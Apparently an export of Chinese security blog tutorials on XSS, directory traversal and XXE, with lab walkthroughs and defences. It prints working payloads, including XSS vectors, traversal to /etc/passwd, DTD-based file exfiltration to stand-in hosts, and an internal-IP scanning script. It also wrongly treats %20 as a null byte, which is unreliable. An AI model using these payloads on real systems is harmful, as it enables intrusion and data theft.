标签&lt;img&gt; 标签定义 HTML 页面中的图像。\n&lt;img src=1 onerror=alert(1);>&lt;img src=1 onerror=alert(\"xss\");>\n\ninput 标签&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。onfocus 事件在对象获得焦点时发生：\n&lt;input onfocus=alert(1);>\n\n竞争焦点，从而触发 onblur 事件：\n&lt;input onblur=alert(1) autofocus>&lt;input autofocus> \n\ninput 标签的 autofocus 属性规定当页面加载时 &lt;input&gt; 元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：\n&lt;input onfocus=\"alert(1);\" autofocus>\n\ndetails 标签&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：\n&lt;details ontoggle=alert(1);>\n\n使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：\n&lt;details open ontoggle=alert(1);>\n\nsvg 标签&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。\n&lt;svg onload=alert(1);>\n\nselect 标签&lt;select&gt; 标签用来创建下拉列表。\n&lt;select onfocus=alert(1)>&lt;/select>\n\n通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：\n&lt;select onfocus=alert(1) autofocus>\n\niframe 标签&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。\n&lt;iframe onload=alert(1);>&lt;/iframe>\n\nvideo 标签&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。\n&lt;video>&lt;source onerror=alert(1)>\n\naudio 标签&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。\n&lt;audio src=x  onerror=alert(1);>\n\nbody 标签&lt;body&gt; 标签定义文档的主体。\n&lt;body onload=alert(1);>\n\nonscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：\n&lt;bodyonscroll=alert(1);>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;br>&lt;input autofocus>\n\ntextarea 标签&lt;textarea&gt; 标签定义一个多行的文本输入控件。\n&lt;textarea onfocus=alert(1); autofocus>\n\n\nkeygen 标签&lt;keygen autofocus onfocus=alert(1)> //仅限火狐\n\n\nmarquee 标签&lt;marquee onstart=alert(1)>&lt;/marquee> //Chrome不行，火狐和IE都可以\n\nisindex 标签&lt;link&gt; 标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：\n&lt;link rel=import href=\"http://47.xxx.xxx.72/evil.js\">\n\n4. DOM 型 XSS 的利用\n和前文说的一样，各种 js 中捣鼓\n\n(1) jQuery 中的 DOM 型 XSS有问题的代码如下图所示\n\n\n若为进行任意过滤的时候 Payload\n&lt;img src=1 onerror=alert(1)>\n\n\n(2) 利用遗留下的测试代码不多扯了，详见 WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)\n0x06 XSS 的实战应用几种钓鱼，和 getshellXSS 实战攻击思路总结从xss到getshell–xss的深层次利用与探讨\n0x07 CSRF 和 XSS 的区别1、CSRF是跨站请求伪造;  XSS是跨域脚本攻击。2、CSRF需要用户先登录网站A,获取cookie;  XSS不需要登录。3、CSRF是利用网站A本身的漏洞,去请求网站A的api;  XSS是向网站A注入JS代码,然后执行JS里的代码,篡改网站A的内容。（XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。你可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求。）\n0x08 XSS 的防御\n主要是两层： 一： 对输出端的数据进行编码 二:  验证输入\n\n目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。\n1. 对输出端的数据进行编码1）将一些字符进行转义，例如 &lt;，&gt; 进行转义2）白名单，通过一些标签限制3）不要把后端传进来的数据直接作为 HTML 渲染，进行处理\n2. CSP 的应用严格的 CSP 在 XSS 的防范中可以起到以下的作用：\n\n禁止加载外域代码，防止复杂的攻击逻辑。\n禁止内联脚本执行。\n禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。\n合理使用上报可以及时发现 XSS，利于尽快修复问题。\n\n3. 其他安全措施\nHTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。\n验证码：防止脚本冒充用户提交危险操作。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"从0到1完全掌握目录遍历漏洞","url":"/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/326213.html\n\n\n从0到1完全掌握目录遍历漏洞0x01 什么是目录遍历漏洞目录遍历漏洞是由于网站存在配置缺陷，导致网站目录可以被任意浏览，这会导致网站很多隐私文件与目录泄露。\n比如数据库备份文件、配置文件等，攻击者利用该信息可以为进一步入侵网站做准备。\n简单来说，我个人认为目录遍历更像是一种 trick，是一种可以配合其他攻击一起使用的 trick，利用方法高于 CSRF 与 CORS。\n早在最早接触的 dirb、御剑、Burpsuite 中的目录爆破工具，如果能扫出一些存在&#x2F;存活的目录，其实就是目录遍历漏洞的一种。\n\n总而言之，目录遍历这个漏洞是需要经常去摸一摸，探一探的。\n存在资源的地方就极有可能存在目录遍历。\n\n0x02 几种目录遍历攻击手段\n首先要特别明确的一个点是，目录遍历的攻击基于操作系统。基于操作系统，例如 Linux 操作系统下，cd .. 命令是返回上一级目录。\n\n\n../这个命令，贯穿了整个目录遍历攻击，也是目录遍历攻击的核心。\n\n\n如果对方服务器是 Linux，攻击手段就是通过 ../，这一个../将贯穿整个目录遍历攻击，\n\n1. 在文件上传中利用目录遍历漏洞靶场地址：WebGoat 靶场，目录遍历下的 PageLesson2\n题目中简单描述了通过文件上传利用目录遍历漏洞\n\n靶场界面\n\n\n\n题目的要求，让我们讲图片上传至非本目录下。\n本来要上传的目录是：&#x2F;PathTraversal&#x2F;user&#x2F;tests 下，我们能够通过目录遍历的方式，将要上传的图片上传至其他目录\n\n已经 OS 为 Linux，所以使用 ../ 来完成目录遍历攻击\n利用 Burpsuite 抓包，将 “test” 修改为 “..&#x2F;test”，也就是 &#x2F;test 目录的上一级目录。\n\n\n如图，修改成功，将头像上传至 &#x2F;PathTraversal&#x2F;user 目录下了。\n2. 对网站上存在的资源点进行目录遍历攻击\n网站上存在的资源点：比如图片这种资源，在请求图片的同时尝试目录遍历。\n\n例如，图片资源所在的目录：\n127.0.0.1&#x2F;home&#x2F;image\n\n而在 127.0.0.1&#x2F;home 下存在一个名为 password.txt 的文件\nimage 通过 GET 请求获取参数，那么获取图片的 url 就是\n127.0.0.1&#x2F;home&#x2F;image?filename&#x3D;1.jpg\n\n当然，&#x2F;home 根目录当然不会流出来。此时如果我们将 filename 的请求变成 ../1.jpg，请求就变成了\n127.0.0.1&#x2F;home&#x2F;image?filename&#x3D;..&#x2F;1.jpg\n\n直接就访问到了 &#x2F;home 这一目录下，所以此时，若我们把请求再构造一下，就不是那么简单的事情了，filename=../password.txt，请求就变成了\n127.0.0.1&#x2F;home&#x2F;image?filename&#x3D;..&#x2F;password.txt\n\n这下就出大问题了吧！~\n接下来我们通过一道靶场再深化一下对已有资源点进行目录遍历的攻击方式\n靶场地址：已有资源点的目录遍历\n靶场要求我们搞到 &#x2F;etc&#x2F;passwd 这一文件\n\n靶场界面如图所示\n\n\n抓包，并点开图片，获取到图片的 GET 请求。并直接开始我们的目录遍历攻击。\n\n\n目录遍历攻击成功，返回的是 400，说明服务器后台并未对目录遍历攻击作任何限制，但是并没有请求到资源，再往上一层试试。也就是../../。也失败了，不要着急，继续尝试。\n终于在第三层的时候成功了！不容易啊……\n\n\n\n本身 &#x2F;etc&#x2F;passwd 这一文件在 Linux 当中是非常重要的文件了\n\n我们通过截图其实也很能体会到漏洞的可利用之处，非常之多，轻信息泄露，重 Getshell。\n3. 对于 Zip 文件，在文件上传中，可以替代头像上传，并利用目录遍历\n场景应用于文件上传界面，但同样也是一个非常特殊的点。早在之前人们并不重视这个情况的时候，Zip 文件可以作为文件上传。\n攻击者可以利用 ../ 来改变 Zip 包中某个文件的存放位置。\n\n\n明明也算是文件上传的部分，但也要单独拉出来说道说道\n\nZip 文件在解压之后，在攻击者的精心设计之下，很有概率会覆盖服务器上原有的文件。举个例子，php 当中的 .htacess 文件就是最著名的文件上传的覆盖，若是覆盖了 .htacess 文件，那就出大事儿咯 ~\n0x03 目录遍历普通防御的绕过方式1. 对简单 ../ 的目录遍历防御当服务器后台过滤 ../ 的时候，例如这段代码\nreturn super.execute(file, fullName != null ? fullName.replace(\"../\", \"\") : \"\");\n\n此时因为输入的 ../ 会被处理，替换成空格。\n那么我们通过双写绕过，也就是输入..././ ，它会被解析成 &#x3D;&#x3D;》 ../成功绕过~\n靶场地址： WebGoat Path Traversal PageLesson3\n\n一般的防御手段的源码如图所示\n\n\n\n绕过如图所示\n\n2. GET 请求参数中不允许存在 .. 与 /回顾一下之前的例子：对网站上存在的资源点进行目录遍历攻击\n此时我们请求资源是通过 GET 请求中的参数的，若参数中不允许存在 .. 与 / ，较难进行目录遍历攻击，但总归还是有绕过方法的 ~\n\n原理： 服务器后台在获取我们的参数值之后，会进行一次 url 编码，若只是单纯的对参数进行这种过滤，则可以通过 url 编码绕过。\npayload\n\n?filename&#x3D;%2e%2e%2f&#x2F;etc&#x2F;passwd\n\n%2e%2e  ——&gt;   ..%2f     ——&gt;    &#x2F;\n可以如此绕过。具体靶场可以看 WebGoat Path Traversal PageLesson5\n\n防御的源码如图所示\n\n\n\n使用 url 编码绕过\n\n3. 当服务器只允许获取当前格式的资源\n情景：若此时资源为图像，那么服务器只允许的请求是 ?filename=图片格式的后缀。只有 ?filename=1.jpg 才可以被请求。\n绕过手段：空字节绕过\n\n原本的 payload\n?filename&#x3D;..&#x2F;etc&#x2F;passwd\n\n因为服务器限制了请求的资源，所以此时必然会报错。\n空字节绕过，也就是增添空格，因为空格后的内容都会被自动过滤。而空格对应的 hex 编码为 %20，所以我们构造新的 payload\n?filename=../etc/passwd%201.jpg\n\n&lt;!--转换一下，也就是-->\n\n?filename=../etc/passwd 1.jpg\n在空字节存在的情况下，空格后面的内容会直接被注释掉，就变成了这样\n?filename=../etc/passwd\n\n绕过实现 GET ~ !\n0x04 目录遍历的终极防御手段\n前面讲了一些目录遍历存在的简单的防御手段，并不顶用，接下来我们介绍一下能够很好防御目录遍历的方法\n\n1. 限制用户输入的路径在某一个范围内。2. 标准化所有字符当用户请求访问文件&#x2F;目录时，直接标准化所有字符，将所有字符转换成 url 编码，这样做之后，到了服务器手上不会解析成 ../，就不存在目录遍历了。\n3. 验证用户的输入是否在白名单那内也就是限制用户请求资源，对于少量的文件(例如都是图像)，写正则表达式批量规范请求资源的白名单，这样可以做到完美防御目录遍历漏洞。\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"从0到1完全掌握XXE","url":"/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/330086.html\n\n\n从0到1完全掌握XXE0x01 前置知识 XML 定义实体XML 实体允许定义在分析 XML 文档时将由内容替换的标记，这里我的理解就是定义变量，然后赋值的意思一致。就比如一些文件上传的 payload 中就会有。\nXML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子\n&lt;?xml version=\"1.0\"?>//这一行是 XML 文档定义\n&lt;!DOCTYPE message [\n&lt;!ELEMENT message (receiver ,sender ,header ,msg)>\n&lt;!ELEMENT receiver (#PCDATA)>\n&lt;!ELEMENT sender (#PCDATA)>\n&lt;!ELEMENT header (#PCDATA)>\n&lt;!ELEMENT msg (#PCDATA)>\n\n上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写\n&lt;message>\n&lt;receiver>Myself&lt;/receiver>\n&lt;sender>Someone&lt;/sender>\n&lt;header>TheReminder&lt;/header>\n&lt;msg>This is an amazing book&lt;/msg>\n&lt;/message>\n\n而我们必须在 DTD 中创建一个实体，DTD 也就是定义文档类型的文件，一般来说都有 &lt;!DOCTYPE 这种字样。\n\n\n一旦解析器处理了 XML 文档，它将用定义的常量“Jo Smith”替换定义的实体 &amp;js\n大多数情况下，框架会根据 xml 结构自动填充 Java 对象。\n\n\n通俗一点自己写一段代码的话\n示例代码：\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY >\n&lt;!ENTITY xxe \"test\" >]>\n\n这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样\n示例代码：\n&lt;creds>\n&lt;user>&amp;xxe;&lt;/user>\n&lt;pass>mypass&lt;/pass>\n&lt;/creds>\n\n我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。\n0x02 什么是 XXE\n个人认为，XXE 可以归结为一句话：构造恶意 DTD\n\n介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞。\n\n\n既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE。\nXML 外部实体注入，全称为 XML external entity injection，某些应用程序允许 XML 格式的数据输入和解析，可以通过引入外部实体的方式进行攻击。\n我们之前在 0x01 当中所讲的例子均为内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：示例代码：\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY >\n&lt;!ENTITY xxe SYSTEM \"file:///c:/test.dtd\" >]>\n&lt;creds>\n    &lt;user>&amp;xxe;&lt;/user>\n    &lt;pass>mypass&lt;/pass>\n&lt;/creds>\n\n这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）\n当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：\n&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>\n\n这个在我们的攻击中也可以起到和 SYSTEM 一样的作用\n重点二：\n我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。\n1.通用实体\n用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用\n示例代码：\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?> \n&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"> ]> \n&lt;updateProfile>  \n    &lt;firstname>Joe&lt;/firstname>  \n    &lt;lastname>&amp;file;&lt;/lastname>  \n    ... \n&lt;/updateProfile>\n\n2.参数实体：\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体(3)和通用实体一样，参数实体也可以外部引用\n示例代码：\n&lt;!ENTITY % an-element \"&lt;!ELEMENT mytag (subtag)>\"> \n&lt;!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"> \n%an-element; %remote-dtd;\n\n参数实体在我们 Blind XXE 中起到了至关重要的作用\n0x03 XXE 的危害\n1.像上文那个 file:&#x2F;&#x2F;xxx 的，很明显可以造成敏感数据泄露。\n2.可以利用 XXE 执行 SSRF 攻击。\n3.利用盲 XXE 将泄露数据外带；通过报错信息检索数据。\n4.XXE 与文件上传结合，造成 getshell。\n\n\n我们后续慢慢看 XXE 的危害。\n\n0x04 XXE 几种攻击方式学习1. 通过 File 协议进行文件读取示例代码：\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?> \n&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"> ]> \n&lt;updateProfile>  \n    &lt;firstname>Joe&lt;/firstname>  \n    &lt;lastname>&amp;file;&lt;/lastname>  \n    ... \n&lt;/updateProfile>\n这里的 firstname 以及 lastname 都是在 XML 文件中解析的，我们尝试自己构造 payload 的话可以是这样\n&lt;?xml version='1.0'?>\n&lt;!DOCTYPE any[&lt;!ENTITY test SYSTEM \"file:///etc/passwd\">]>\n&lt;comment>\n&lt;text>&amp;test;&lt;/text>\n&lt;/comment>\ntest -&gt; “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd” 通俗易懂\n我们依靠一道靶场来加强一下感受\n\nLab: Exploiting XXE using external entities to retrieve files\n\n题意：通过 XXE 注入爆出 /etc/passwd 的内容\n\n进入靶场之后，先点击任意一个商品 - “view details”，再 Check stock 并抓包。\n这里的 productId 以及 storeId 是通过 XML 的形式传进来的，尝试通过 File 协议进行文件读取\n\n\npayload：\n&lt;?xml version='1.0'?>\n&lt;!DOCTYPE any[&lt;!ENTITY test SYSTEM \"file:///etc/passwd\">]>\n&lt;stockCheck>\n&lt;productId>&amp;test;&lt;/productId>\n&lt;storeId>\n4\n&lt;/storeId>\n&lt;/stockCheck>\n\n\n\n至于为什么会产生这个漏洞，如果想学习代码审计的师傅可以移步至我博客细究一下 代码审计XXE注入 | 芜风\n2. XXE 盲注\n所谓盲注，就是无回显\n\nXXE 盲注的一般思路，需要使用第三方平台协助攻击。\n(1) 基本盲注以 Port 靶场为例。\n\nLab: Blind XXE with out-of-band interaction via XML parameter entities\npayload：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM \"http://d0eh504fzx1hdqnbch9xrbfe056vuk.burpcollaborator.net\"> %xxe; ]>\n&lt;stockCheck>\n\t&lt;productId>\n\t\t&amp;xxe;\n\t&lt;/productId>\n\t&lt;storeId>\n\t\t1\n\t&lt;/storeId>\n&lt;/stockCheck>\n\n\n\n(2) 多个 DTD 的调用攻击这里以 PHP 代码为例进行说明\nxml.php\n&lt;?php\n\nlibxml_disable_entity_loader (false);\n$xmlfile = file_get_contents('php://input');\n$dom = new DOMDocument();\n$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); \n?>\n\n直接上 payload，并用 payload 加以理解\n&lt;!DOCTYPE convert [ \n&lt;!ENTITY % remote SYSTEM \"http://ip/test.dtd\">\n%remote;%int;%send;\n]\n\n这是我们对要进行渗透的 payload，有三个参数 %remote, %int, %send；后面接的网站 http://ip/test.dtd 是我们挂在服务器&#x2F;第三方网站的恶意 DTD。我们在这个第三方网站的恶意 DTD 中添加第二层恶意 DTD\ntest.dtd\n\n\n接着，%int 去调用 test.dtd 当中的 file，这里稍微慢一点，分析一下 % int &quot;&lt;!ENTITY % send SYSTEM &#39;http://ip:9999?p=%file;；也就是 %file 在前面被定义，而 %file 则是恶意读取了文件，这里可以替换成 &#x2F;etc&#x2F;passwd 这类。\n如此一来，%int 成为了这个网站的恶意 DTD，在 %int 里面定义了一个 %send 的变量名称。由此，最后一个调用的参数 %send 就相当于我们在上面一个案例中的基础 payload\n&lt;?xml version='1.0'?>\n&lt;!DOCTYPE send[&lt;!ENTITY test SYSTEM 'http://ip:9999?p=file:///etc/passwd;'>]>\n&lt;comment>\n&lt;text>&amp;send;&lt;/text>\n&lt;/comment>\n\n这样，我们三层的 payload 经过抽丝剥茧，变成了一层简单的 payload。接下来我们来看一道简单的 Port 靶场上的盲注\n\nLab: Exploiting blind XXE to exfiltrate data using a malicious external DTD\n\n题目要求我们爆出 &#x2F;etc&#x2F;hostname 的文件\n\n依旧是在 Stock 界面进行抓包，同样是 XML 形式\n\n\nPort 里面的渗透测试是给我们第三方的服务器的，也就是 exploit server，但是在真正的渗透测试中，如果要测盲注的话，还是需要自己的服务器的。\n按照之前的思路，进行多层恶意 DTD 的构造，并把这个恶意 DTD 挂在第三方服务器上面。\n\n\n这里点 Store，因为存储之后，就等于你在你自己的服务器上面有了这个恶意的 DTD，一会儿复用即可。恶意 DTD 的 URL 我放在下面，每个人进靶场都是不一样的\n\nURL: https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit\n\n\n\n成功，我们 exploit 的 /etc/hostname 在 GET 请求参数中\n(3) 报错型盲注\n报错型注入是基于 “多个 DTD 的调用攻击“\n\n攻击思路；和 “多个 DTD 的调用攻击“ 大部分一致，稍有不同\n\n\nevil.dtd\n&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"> \n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'>\"> \n%eval; \n%exfil;\n\n攻击的 payload\n&lt;!DOCTYPE foo [&lt;!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM \"YOUR-DTD-URL\"> \n%xxe;]>\n\n\n剖析一下\n\n先调用 &amp;xxe;，&amp;xxe; 去调用上面的恶意 DTD，恶意 DTD 调用了 file:///etc/passwd 这一操作，这一操作，又被 &amp;eval 中的内容又会在 &amp;exfil 中的 &#39;file:///invalid/%file;&#39; 所调用。但是 invalid&#x2F;%file 后面的内容一定是报错的，这个报错消息反而会被带出来。\n这也就是 XXE 盲注中的报错注入\n\nLab: Exploiting blind XXE to retrieve data via error messages\n根据上述的方法，先在 exploit server 中投放恶意 DTD，再在抓包界面进行调用第三方服务器上的 DTD，便可造成报错注入。\n3. 利用 XXE 执行 SSRF书说上文的 file 协议我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求。\n我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？\n没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。\n新的利用方式不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。\n\n\n我们的 payload 一般长这样\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"http://对方的内网IP\"> ]>\n&lt;test>\n\t&amp;xxe;\n&lt;/test>\n\n当我们无法确定对方的具体 IP 时，可以通过 EXP 的方式进行探测。这里借用 K0rz3n 师傅的 EXP\n内网 IP 爆破import requests\nimport base64\n\n#Origtional XML that the server accepts\n#&lt;xml>\n#    &lt;stuff>user&lt;/stuff>\n#&lt;/xml>\n\n\ndef build_xml(string):\n    xml = \"\"\"&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\"\"\"\n    xml = xml + \"\\r\\n\" + \"\"\"&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >\"\"\"\n    xml = xml + \"\\r\\n\" + \"\"\"&lt;!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\">]>\"\"\"\n    xml = xml + \"\\r\\n\" + \"\"\"&lt;xml>\"\"\"\n    xml = xml + \"\\r\\n\" + \"\"\"    &lt;stuff>&amp;xxe;&lt;/stuff>\"\"\"\n    xml = xml + \"\\r\\n\" + \"\"\"&lt;/xml>\"\"\"\n    send_xml(xml)\n\ndef send_xml(xml):\n    headers = &#123;'Content-Type': 'application/xml'&#125;\n    x = requests.post('存在 XXE 的 URL', data=xml, headers=headers, timeout=5).text \n    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value\n    print coded_string\n#   print base64.b64decode(coded_string)\nfor i in range(1, 255):\n    try:\n        i = str(i)\n        ip = '10.0.0.' + i # 对应的内网 IP 地址\n        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'\n        print string\n        build_xml(string)\n    except:\ncontinue\n\n\n内网端口爆破端口的爆破可以使用 Burpsuite 来完成\n比如我们传入：\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>  \n&lt;!DOCTYPE data SYSTEM \"http://127.0.0.1:515/\" [  \n&lt;!ELEMENT data (#PCDATA)>  \n]>\n&lt;data>4&lt;/data>\n\n对端口号添加引用符，放置于 Burpsuite Intruder 当中爆破。\n\n靶场：Lab: Exploiting XXE to perform SSRF attacks\n常规抓包\n\n\n构造 payload\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]>\n&lt;stockCheck>\n\t&lt;productId>\n\t\t&amp;xxe;\n\t&lt;/productId>\n\t&lt;storeId>\n\t\t1\n\t&lt;/storeId>\n&lt;/stockCheck>\n\n这里 169.254.169.254 是对方服务器的 IP\n\n发包之后，回显是 400，告诉我们 “Invalid product ID: latest”；再进一步添加接口。\n\n一步步添加接口，直至出现回显数据为止，这种 SSRF 只能够读取到文件，个人认为危害性一般。\n4. XXE 与文件上传结合(1) 使用 svg 上传图片\nSVG 图片是一种基于 XML 语法的图像格式，是一种矢量图。\n\n那么我们结合文件上传的功能，可以在 SVG 中编辑 XML 语句，从而达到 XXE 的攻击效果。\n一般的 payload\n&lt;?xml version=\"1.0\" standalone=\"yes\"?>\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n\n &lt;text font-size=\"16\" x=\"0\" y=\"16\">\n\n &amp;xxe;\n\n &lt;/text>\n\n&lt;/svg>\n\n这样一来，我们想要知道的信息就能够被暴露在上传的图片当中，也就是此 SVG 图片中。\n\nLab: Exploiting XXE via image file upload\n前往 blog 的评论区界面，先事先创建好 1.svg，并在 SVG 文件当中编辑如下，作为我们的 payload\n&lt;?xml version=\"1.0\" standalone=\"yes\"?>\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n &lt;text font-size=\"16\" x=\"0\" y=\"16\">\n &amp;xxe;\n &lt;/text>\n&lt;/svg>\n\n上传后，我们的 SVG 图片中突然多了些许文字，点进去查看即可解题。\n(2) 利用 jar:&#x2F;&#x2F; 协议的攻击\n这一段内容参考于 K0rz3n 师傅的文章\n\njar:&#x2F;&#x2F; 协议的格式：\njar:&#123;url&#125;!&#123;path&#125;\n\n实例：\njar:http://host/application.jar!/file/within/the/zip\n\n! 后面就是其需要从中解压出的文件\n\njar 协议处理文件的过程：\n(1) 下载 jar&#x2F;zip 文件到临时文件中(2) 提取出我们指定的文件(3) 删除临时文件\n\n因为在 java 中 file:&#x2F;&#x2F;&#x2F; 协议可以起到列目录的作用，所以我们能用 file:&#x2F;&#x2F;&#x2F; 协议配合 jar:&#x2F;&#x2F; 协议使用\n\n那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的\njar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;1.php\n\n既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题。\n5. 利用 XInclude 攻击利用 XInclude 攻击的方式比起最粗暴的定义 DOCTYPE 来说更加含蓄些许，当我们无法直接定义 DOCTYPE 的时候才会转而向 XInclude 攻击；且要求后端采用的是 SOAP 协议。\n\n先说说 SOAP 协议吧，也不难理解。\n\nSOAP 协议在接收到请求后，SOAP 消息必须以 XML 文档的形式返回，所以要以 SOAP 协议作为后端的 Web 界面才会存在 XXE 的隐患。\nXInclude 攻击的 payload\n&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"> &lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/>&lt;/foo>\n\n不同的是，这里我们被禁止定义 DOCTYPE，所以要对 Web 元素下手。\n\nLab: Exploiting XInclude to retrieve files\n\n\n6. 别样的利用方式，复用本地 DTD这种攻击手段，一般是源于服务器与 VPS 之间存在防火墙，导致数据无法带出。\n\n利用出发点：由于许多包含 DTD 文件的常见 CMS 都是开源的，我们需要寻找要攻击的服务器上的 DTD 文件。\n\n这个方法只需要知道本地DTD文件的路径，并且在该DTD中定义了实体变量并且进行了引用。\n比如在ubuntu16.04中，我使用全局搜索得到以下的一些原生dtd文件：\n//find / name \"*.dtd\"\n 